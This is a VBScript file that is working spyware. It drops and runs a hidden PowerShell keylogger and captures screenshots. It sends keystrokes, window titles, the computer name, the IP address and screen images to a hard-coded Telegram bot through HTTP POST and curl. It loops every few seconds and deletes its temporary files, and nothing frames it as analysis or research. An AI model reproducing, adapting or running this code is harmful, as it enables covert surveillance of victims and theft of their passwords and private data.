' Declare necessary objects
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Telegram Bot Variables
telegram_token = "7903894927:AAFx6hah2_lsxnesnYQLV474drvqDhqUE58"
chat_id = "7975364416"

' Define the directory where files will be saved
script_directory = objFSO.GetParentFolderName(WScript.ScriptFullName)
screenshotFilePath = script_directory & "\screenshot.png"
logFilePath = script_directory & "\log.txt"

' Get computer info
computerName = objShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
ipAddress = GetIPAddress()

' Send initial connection message
SendTelegramMessage("New connection! PC: " & computerName & " | IP: " & ipAddress)

' Function to get IP address
Function GetIPAddress()
    On Error Resume Next
    Dim ipAddress
    ipAddress = "Unknown"
    
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    
    For Each objItem in colItems
        If Not IsNull(objItem.IPAddress) Then
            For Each ip in objItem.IPAddress
                If Left(ip, 3) <> "169" And Left(ip, 3) <> "127" And InStr(ip, ":") = 0 Then
                    ipAddress = ip
                    Exit For
                End If
            Next
        End If
        If ipAddress <> "Unknown" Then Exit For
    Next
    
    GetIPAddress = ipAddress
End Function

' Function to send message to Telegram
Sub SendTelegramMessage(text)
    On Error Resume Next
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "POST", "https://api.telegram.org/bot" & telegram_token & "/sendMessage", False
    objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    objHTTP.Send "chat_id=" & chat_id & "&text=" & text
    
    ' Log errors if they occur
    If Err.Number <> 0 Then
        WriteToLog "Error sending message: " & Err.Description
        Err.Clear
    End If
End Sub

' Function to write to log file
Sub WriteToLog(message)
    On Error Resume Next
    Set logFile = objFSO.OpenTextFile(logFilePath, 8, True)
    logFile.WriteLine Now & " - " & message
    logFile.Close
End Sub

' Function to send screenshot to Telegram
Sub SendScreenshot()
    On Error Resume Next
    
    ' Delete old screenshot if it exists
    If objFSO.FileExists(screenshotFilePath) Then
        objFSO.DeleteFile screenshotFilePath
    End If
    
    ' Take screenshot using PowerShell (without admin rights) - hidden window
    Dim psScript
    psScript = "$ErrorActionPreference = 'Stop';" & _
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;" & _
        "try {" & _
        "  $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;" & _
        "  $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;" & _
        "  $graphics = [System.Drawing.Graphics]::FromImage($bitmap);" & _
        "  $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);" & _
        "  $bitmap.Save('" & screenshotFilePath & "', [System.Drawing.Imaging.ImageFormat]::Png);" & _
        "  $graphics.Dispose();" & _
        "  $bitmap.Dispose();" & _
        "  Write-Output 'Screenshot saved successfully';" & _
        "} catch {" & _
        "  Write-Output ('Error: ' + $_.Exception.Message);" & _
        "}"
    
    ' Create temporary script file
    Dim tempPsFile
    tempPsFile = script_directory & "\temp_shot.ps1"
    Set psFile = objFSO.CreateTextFile(tempPsFile, True)
    psFile.Write psScript
    psFile.Close
    
    ' Execute PowerShell script with no window and wait for it to complete
    objShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempPsFile & """", 0, True
    
    ' Delete temporary file
    If objFSO.FileExists(tempPsFile) Then
        objFSO.DeleteFile tempPsFile
    End If
    
    ' Give additional time for the screenshot to be saved
    WScript.Sleep 3000
    
    ' Check if screenshot file exists and has content
    If objFSO.FileExists(screenshotFilePath) Then
        Dim screenshot
        Set screenshot = objFSO.GetFile(screenshotFilePath)
        If screenshot.Size > 0 Then
            WriteToLog "Screenshot captured successfully: " & screenshotFilePath & " (" & screenshot.Size & " bytes)"
        Else
            WriteToLog "Screenshot file exists but is empty"
            objFSO.DeleteFile screenshotFilePath
            Exit Sub
        End If
    Else
        WriteToLog "Screenshot file was not created"
        Exit Sub
    End If
End Sub

' Function to send screenshot with system info to Telegram using curl
Sub SendSystemInfo()
    On Error Resume Next
    
    ' Take screenshot
    SendScreenshot()
    
    ' Check if screenshot file exists
    If Not objFSO.FileExists(screenshotFilePath) Then
        WriteToLog "Screenshot file not found for sending"
        SendTelegramMessage "Failed to capture screenshot from PC: " & computerName & " | IP: " & ipAddress
        Exit Sub
    End If
    
    ' Create a temporary curl script to send the photo (this method is more reliable than XMLHTTP for binary data)
    Dim curlScript, curlFile
    curlFile = script_directory & "\send_photo.cmd"
    
    ' Create caption with system info
    Dim caption
    caption = "IP: " & ipAddress & " | PC: " & computerName & " | Time: " & Now
    
    ' Create curl command
    curlScript = "@echo off" & vbCrLf & _
                "curl -s -X POST ""https://api.telegram.org/bot" & telegram_token & "/sendPhoto"" " & _
                "-F chat_id=""" & chat_id & """ " & _
                "-F photo=""@" & screenshotFilePath & """ " & _
                "-F caption=""" & caption & """"
    
    ' Write curl script to file
    Set cmdFile = objFSO.CreateTextFile(curlFile, True)
    cmdFile.Write curlScript
    cmdFile.Close
    
    ' Run the curl command with hidden window
    objShell.Run "cmd /c " & curlFile, 0, True
    
    ' Cleanup
    If objFSO.FileExists(curlFile) Then
        objFSO.DeleteFile curlFile
    End If
    
    ' Wait a bit before trying to delete the screenshot
    WScript.Sleep 1000
    
    ' Try to delete the screenshot file
    If objFSO.FileExists(screenshotFilePath) Then
        On Error Resume Next
        objFSO.DeleteFile screenshotFilePath
        If Err.Number <> 0 Then
            Err.Clear
        End If
    End If
    
    If Err.Number <> 0 Then
        WriteToLog "Error sending system info: " & Err.Description
        Err.Clear
    End If
End Sub

' Improved keylogger function with accurate key capture and caps lock detection
Sub CaptureKeystrokes()
    On Error Resume Next
    
    ' Create a file to store keystrokes temporarily
    Dim keystrokeFile
    keystrokeFile = script_directory & "\keystrokes.txt"
    
    ' Create PowerShell script to monitor keystrokes
    Dim psKeyloggerScript, psKeyloggerFile
    psKeyloggerFile = script_directory & "\keylogger.ps1"
    
    ' Improved PowerShell script for more accurate keystroke capture with caps lock detection
    psKeyloggerScript = "$keylogFile = '" & keystrokeFile & "'" & vbCrLf & _
                       "$signatures = @'" & vbCrLf & _
                       "[DllImport(""user32.dll"", CharSet=CharSet.Auto, ExactSpelling=true)] " & vbCrLf & _
                       "public static extern short GetAsyncKeyState(int virtualKeyCode); " & vbCrLf & _
                       "[DllImport(""user32.dll"", CharSet=CharSet.Auto)] " & vbCrLf & _
                       "public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count); " & vbCrLf & _
                       "[DllImport(""user32.dll"", CharSet=CharSet.Auto)] " & vbCrLf & _
                       "public static extern IntPtr GetForegroundWindow(); " & vbCrLf & _
                       "[DllImport(""user32.dll"")] " & vbCrLf & _
                       "public static extern int GetKeyboardState(byte[] keystate); " & vbCrLf & _
                       "[DllImport(""user32.dll"")] " & vbCrLf & _
                       "public static extern int GetKeyState(int keyCode); " & vbCrLf & _
                       "[DllImport(""user32.dll"")] " & vbCrLf & _
                       "public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr, SizeParamIndex = 4)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags); " & vbCrLf & _
                       "'@ " & vbCrLf & _
                       "$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru " & vbCrLf & _
                       "$lastWindow = """" " & vbCrLf & _
                       "$buffer = """" " & vbCrLf & _
                       "$startTime = Get-Date " & vbCrLf & _
                       "# Track which keys are currently pressed to avoid duplicates" & vbCrLf & _
                       "$pressedKeys = @{}" & vbCrLf & _
                       "# Special key constants" & vbCrLf & _
                       "$VK_SHIFT = 0x10" & vbCrLf & _
                       "$VK_CONTROL = 0x11" & vbCrLf & _
                       "$VK_MENU = 0x12 # ALT key" & vbCrLf & _
                       "$VK_CAPITAL = 0x14 # CAPS LOCK" & vbCrLf & _
                       "# Function to check if Caps Lock is on" & vbCrLf & _
                       "function IsCapsLockOn {" & vbCrLf & _
                       "  return ([API.Win32]::GetKeyState(0x14) -band 1) -eq 1" & vbCrLf & _
                       "}" & vbCrLf & _
                       "# Function to get current keyboard state" & vbCrLf & _
                       "function GetKeyboardStateBytes {" & vbCrLf & _
                       "  $keyboardState = New-Object Byte[] 256" & vbCrLf & _
                       "  [API.Win32]::GetKeyboardState($keyboardState) | Out-Null" & vbCrLf & _
                       "  return $keyboardState" & vbCrLf & _
                       "}" & vbCrLf & _
                       "# Create a mapping for special characters" & vbCrLf & _
                       "$specialKeys = @{" & vbCrLf & _
                       "  8 = '[Backspace]'" & vbCrLf & _
                       "  9 = '[Tab]'" & vbCrLf & _
                       "  13 = '[Enter]'" & vbCrLf & _
                       "  16 = '[Shift]'" & vbCrLf & _
                       "  17 = '[Ctrl]'" & vbCrLf & _
                       "  18 = '[Alt]'" & vbCrLf & _
                       "  19 = '[Pause]'" & vbCrLf & _
                       "  20 = '[Caps Lock]'" & vbCrLf & _
                       "  27 = '[Esc]'" & vbCrLf & _
                       "  32 = ' '" & vbCrLf & _
                       "  33 = '[Page Up]'" & vbCrLf & _
                       "  34 = '[Page Down]'" & vbCrLf & _
                       "  35 = '[End]'" & vbCrLf & _
                       "  36 = '[Home]'" & vbCrLf & _
                       "  37 = '[Left]'" & vbCrLf & _
                       "  38 = '[Up]'" & vbCrLf & _
                       "  39 = '[Right]'" & vbCrLf & _
                       "  40 = '[Down]'" & vbCrLf & _
                       "  44 = '[Print Screen]'" & vbCrLf & _
                       "  45 = '[Insert]'" & vbCrLf & _
                       "  46 = '[Delete]'" & vbCrLf & _
                       "  91 = '[Windows]'" & vbCrLf & _
                       "  92 = '[Windows]'" & vbCrLf & _
                       "  93 = '[Menu]'" & vbCrLf & _
                       "  144 = '[Num Lock]'" & vbCrLf & _
                       "  186 = ';'" & vbCrLf & _
                       "  187 = '='" & vbCrLf & _
                       "  188 = ','" & vbCrLf & _
                       "  189 = '-'" & vbCrLf & _
                       "  190 = '.'" & vbCrLf & _
                       "  191 = '/'" & vbCrLf & _
                       "  192 = '`'" & vbCrLf & _
                       "  219 = '['" & vbCrLf & _
                       "  220 = '\\'" & vbCrLf & _
                       "  221 = ']'" & vbCrLf & _
                       "  222 = ""'""" & vbCrLf & _
                       "}" & vbCrLf & _
                       "# Shift key translations for US keyboard" & vbCrLf & _
                       "$shiftKeys = @{" & vbCrLf & _
                       "  '1' = '!'" & vbCrLf & _
                       "  '2' = '@'" & vbCrLf & _
                       "  '3' = '#'" & vbCrLf & _
                       "  '4' = '$'" & vbCrLf & _
                       "  '5' = '%'" & vbCrLf & _
                       "  '6' = '^'" & vbCrLf & _
                       "  '7' = '&'" & vbCrLf & _
                       "  '8' = '*'" & vbCrLf & _
                       "  '9' = '('" & vbCrLf & _
                       "  '0' = ')'" & vbCrLf & _
                       "  '`' = '~'" & vbCrLf & _
                       "  '-' = '_'" & vbCrLf & _
                       "  '=' = '+'" & vbCrLf & _
                       "  '[' = '{'" & vbCrLf & _
                       "  ']' = '}'" & vbCrLf & _
                       "  '\\' = '|'" & vbCrLf & _
                       "  ';' = ':'" & vbCrLf & _
                       "  ""'"" = '""'" & vbCrLf & _
                       "  ',' = '<'" & vbCrLf & _
                       "  '.' = '>'" & vbCrLf & _
                       "  '/' = '?'" & vbCrLf & _
                       "}" & vbCrLf & _
                       "while ((Get-Date).Subtract($startTime).TotalSeconds -lt 10) { " & vbCrLf & _
                       "  # Get current window" & vbCrLf & _
                       "  $currentWindow = $API::GetForegroundWindow() " & vbCrLf & _
                       "  $windowTitle = New-Object System.Text.StringBuilder 256 " & vbCrLf & _
                       "  $API::GetWindowText($currentWindow, $windowTitle, 256) | Out-Null " & vbCrLf & _
                       "  $windowText = $windowTitle.ToString() " & vbCrLf & _
                       "  if ($windowText -ne $lastWindow) { " & vbCrLf & _
                       "    if ($buffer -ne """") { " & vbCrLf & _
                       "      Add-Content -Path $keylogFile -Value (""Window: $lastWindow"") " & vbCrLf & _
                       "      Add-Content -Path $keylogFile -Value (""Keys: $buffer"") " & vbCrLf & _
                       "      Add-Content -Path $keylogFile -Value (""---"") " & vbCrLf & _
                       "    } " & vbCrLf & _
                       "    $buffer = """" " & vbCrLf & _
                       "    $lastWindow = $windowText " & vbCrLf & _
                       "  } " & vbCrLf & _
                       "  $capsLockOn = IsCapsLockOn" & vbCrLf & _
                       "  $shiftPressed = ([API.Win32]::GetAsyncKeyState($VK_SHIFT) -band 0x8000) -eq 0x8000" & vbCrLf & _
                       "  # Check for pressed keys" & vbCrLf & _
                       "  for ($char = 0; $char -le 255; $char++) { " & vbCrLf & _
                       "    $keyState = $API::GetAsyncKeyState($char) " & vbCrLf & _
                       "    if (($keyState -band 0x1) -eq 0x1) { " & vbCrLf & _
                       "      # Key was pressed since last check" & vbCrLf & _
                       "      $virtualKey = $char " & vbCrLf & _
                       "      # Handle special keys" & vbCrLf & _
                       "      if ($specialKeys.ContainsKey($virtualKey)) {" & vbCrLf & _
                       "        $keyValue = $specialKeys[$virtualKey]" & vbCrLf & _
                       "      } elseif ($virtualKey -ge 48 -and $virtualKey -le 57) {" & vbCrLf & _
                       "        # Number keys" & vbCrLf & _
                       "        $keyValue = [char]$virtualKey" & vbCrLf & _
                       "        if ($shiftPressed) {" & vbCrLf & _
                       "          if ($shiftKeys.ContainsKey($keyValue)) {" & vbCrLf & _
                       "            $keyValue = $shiftKeys[$keyValue]" & vbCrLf & _
                       "          }" & vbCrLf & _
                       "        }" & vbCrLf & _
                       "      } elseif ($virtualKey -ge 65 -and $virtualKey -le 90) {" & vbCrLf & _
                       "        # Alpha keys" & vbCrLf & _
                       "        # Determine case based on Caps Lock and Shift states" & vbCrLf & _
                       "        $isUpperCase = ($capsLockOn -and -not $shiftPressed) -or (-not $capsLockOn -and $shiftPressed)" & vbCrLf & _
                       "        if ($isUpperCase) {" & vbCrLf & _
                       "          $keyValue = [char]$virtualKey" & vbCrLf & _
                       "        } else {" & vbCrLf & _
                       "          $keyValue = [char]($virtualKey + 32) # Convert to lowercase" & vbCrLf & _
                       "        }" & vbCrLf & _
                       "      } elseif ($virtualKey -ge 96 -and $virtualKey -le 105) {" & vbCrLf & _
                       "        # Numpad numbers" & vbCrLf & _
                       "        $keyValue = [string]($virtualKey - 96)" & vbCrLf & _
                       "      } elseif ($virtualKey -ge 186 -and $virtualKey -le 222) {" & vbCrLf & _
                       "        # Special characters" & vbCrLf & _
                       "        if ($specialKeys.ContainsKey($virtualKey)) {" & vbCrLf & _
                       "          $keyValue = $specialKeys[$virtualKey]" & vbCrLf & _
                       "          if ($shiftPressed -and $shiftKeys.ContainsKey($keyValue)) {" & vbCrLf & _
                       "            $keyValue = $shiftKeys[$keyValue]" & vbCrLf & _
                       "          }" & vbCrLf & _
                       "        } else {" & vbCrLf & _
                       "          $keyValue = ""[VK=$virtualKey]""" & vbCrLf & _
                       "        }" & vbCrLf & _
                       "      } else {" & vbCrLf & _
                       "        # Other keys" & vbCrLf & _
                       "        $keyValue = ""[VK=$virtualKey]""" & vbCrLf & _
                       "      }" & vbCrLf & _
                       "      $buffer += $keyValue" & vbCrLf & _
                       "    }" & vbCrLf & _
                       "  }" & vbCrLf & _
                       "  Start-Sleep -Milliseconds 10" & vbCrLf & _
                       "}" & vbCrLf & _
                       "# Save final buffer" & vbCrLf & _
                       "if ($buffer -ne """") {" & vbCrLf & _
                       "  Add-Content -Path $keylogFile -Value (""Window: $lastWindow"")" & vbCrLf & _
                       "  Add-Content -Path $keylogFile -Value (""Keys: $buffer"")" & vbCrLf & _
                       "  Add-Content -Path $keylogFile -Value (""---"")" & vbCrLf & _
                       "}"
    
    ' Create the PowerShell script file
    Set psFile = objFSO.CreateTextFile(psKeyloggerFile, True)
    psFile.Write psKeyloggerScript
    psFile.Close
    
    ' Run the PowerShell keylogger script hidden
    objShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psKeyloggerFile & """", 0, True
    
    ' Check if keystrokes were captured
    Dim keystrokeContent
    keystrokeContent = ""
    
    If objFSO.FileExists(keystrokeFile) Then
        ' Read the keystrokes file
        Set keystrokeData = objFSO.OpenTextFile(keystrokeFile, 1)
        keystrokeContent = keystrokeData.ReadAll
        keystrokeData.Close
    End If
    
    ' Send Telegram message with keystrokes
    If keystrokeContent <> "" Then
        SendTelegramMessage "PC: " & computerName & " | IP: " & ipAddress & vbCrLf & vbCrLf & keystrokeContent
    End If
    
    ' Clean up files
    If objFSO.FileExists(keystrokeFile) Then
        objFSO.DeleteFile keystrokeFile
    End If
    
    If objFSO.FileExists(psKeyloggerFile) Then
        objFSO.DeleteFile psKeyloggerFile
    End If
End Sub

' Function to generate a GUID-like string
Function CreateGUID()
    Dim i, guid
    guid = ""
    For i = 1 To 16
        guid = guid & Hex(Int(16 * Rnd))
    Next
    CreateGUID = guid
End Function

' Main loop with error handling
Do
    On Error Resume Next
    
    ' Capture and send keystrokes
    CaptureKeystrokes()
    
    ' Send system info including screenshot
    SendSystemInfo()
    
    ' Clear any errors before next iteration
    If Err.Number <> 0 Then
        WriteToLog "Error in monitoring loop: " & Err.Description
        Err.Clear
    End If
    
    ' Sleep for 5 seconds between updates
    WScript.Sleep 5000
Loop
